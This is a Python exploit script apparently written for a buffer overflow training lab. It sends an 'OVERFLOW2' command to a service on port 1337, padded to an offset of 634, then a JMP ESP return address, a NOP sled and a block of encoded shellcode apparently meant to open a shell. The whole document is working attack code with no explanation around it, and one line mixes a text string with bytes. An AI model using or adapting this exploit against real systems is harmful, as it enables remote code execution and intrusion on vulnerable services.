import socket
import struct

HOST = "10.10.250.129"
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(s.recv(1024))

shellcode_shell =  b""
shellcode_shell += b"\xfc\xbb\xf7\xf8\xae\x2a\xeb\x0c\x5e\x56"
shellcode_shell += b"\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3"
shellcode_shell += b"\xe8\xef\xff\xff\xff\x0b\x10\x2c\x2a\xf3"
shellcode_shell += b"\xe1\x51\xa2\x16\xd0\x51\xd0\x53\x43\x62"
shellcode_shell += b"\x92\x31\x68\x09\xf6\xa1\xfb\x7f\xdf\xc6"
shellcode_shell += b"\x4c\x35\x39\xe9\x4d\x66\x79\x68\xce\x75"
shellcode_shell += b"\xae\x4a\xef\xb5\xa3\x8b\x28\xab\x4e\xd9"
shellcode_shell += b"\xe1\xa7\xfd\xcd\x86\xf2\x3d\x66\xd4\x13"
shellcode_shell += b"\x46\x9b\xad\x12\x67\x0a\xa5\x4c\xa7\xad"
shellcode_shell += b"\x6a\xe5\xee\xb5\x6f\xc0\xb9\x4e\x5b\xbe"
shellcode_shell += b"\x3b\x86\x95\x3f\x97\xe7\x19\xb2\xe9\x20"
shellcode_shell += b"\x9d\x2d\x9c\x58\xdd\xd0\xa7\x9f\x9f\x0e"
shellcode_shell += b"\x2d\x3b\x07\xc4\x95\xe7\xb9\x09\x43\x6c"
shellcode_shell += b"\xb5\xe6\x07\x2a\xda\xf9\xc4\x41\xe6\x72"
shellcode_shell += b"\xeb\x85\x6e\xc0\xc8\x01\x2a\x92\x71\x10"
shellcode_shell += b"\x96\x75\x8d\x42\x79\x29\x2b\x09\x94\x3e"
shellcode_shell += b"\x46\x50\xf1\xf3\x6b\x6a\x01\x9c\xfc\x19"
shellcode_shell += b"\x33\x03\x57\xb5\x7f\xcc\x71\x42\x7f\xe7"
shellcode_shell += b"\xc6\xdc\x7e\x08\x37\xf5\x44\x5c\x67\x6d"
shellcode_shell += b"\x6c\xdd\xec\x6d\x91\x08\xa2\x3d\x3d\xe3"
shellcode_shell += b"\x03\xed\xfd\x53\xec\xe7\xf1\x8c\x0c\x08"
shellcode_shell += b"\xd8\xa4\xa7\xf3\x8b\xc0\x3f\x93\x53\xbd"
shellcode_shell += b"\x3d\x63\x19\x4e\xcb\x85\x8b\xa0\x9d\x1e"
shellcode_shell += b"\x24\x58\x84\xd4\xd5\xa5\x12\x91\xd6\x2e"
shellcode_shell += b"\x91\x66\x98\xc6\xdc\x74\x4d\x27\xab\x26"
shellcode_shell += b"\xd8\x38\x01\x4e\x86\xab\xce\x8e\xc1\xd7"
shellcode_shell += b"\x58\xd9\x86\x26\x91\x8f\x3a\x10\x0b\xad"
shellcode_shell += b"\xc6\xc4\x74\x75\x1d\x35\x7a\x74\xd0\x01"
shellcode_shell += b"\x58\x66\x2c\x89\xe4\xd2\xe0\xdc\xb2\x8c"
shellcode_shell += b"\x46\xb7\x74\x66\x11\x64\xdf\xee\xe4\x46"
shellcode_shell += b"\xe0\x68\xe9\x82\x96\x94\x58\x7b\xef\xab"
shellcode_shell += b"\x55\xeb\xe7\xd4\x8b\x8b\x08\x0f\x08\xab"
shellcode_shell += b"\xea\x85\x65\x44\xb3\x4c\xc4\x09\x44\xbb"
shellcode_shell += b"\x0b\x34\xc7\x49\xf4\xc3\xd7\x38\xf1\x88"
shellcode_shell += b"\x5f\xd1\x8b\x81\x35\xd5\x38\xa1\x1f\xd5"
shellcode_shell += b"\xbe\x5d\xa0"


#bad characters \x00\x23\x3C\x83\xBA 
offset = 634
jmp_esp = struct.pack("<I", 0x625011AF)

buf = b""
buf += b"OVERFLOW2 "
buf += b"A" * offset 
buf += jmp_esp
buf += "\x90" * 100 #int3 instruction (breakpoint)
buf += shellcode_shell
s.send(buf)
print(s.recv(1024))
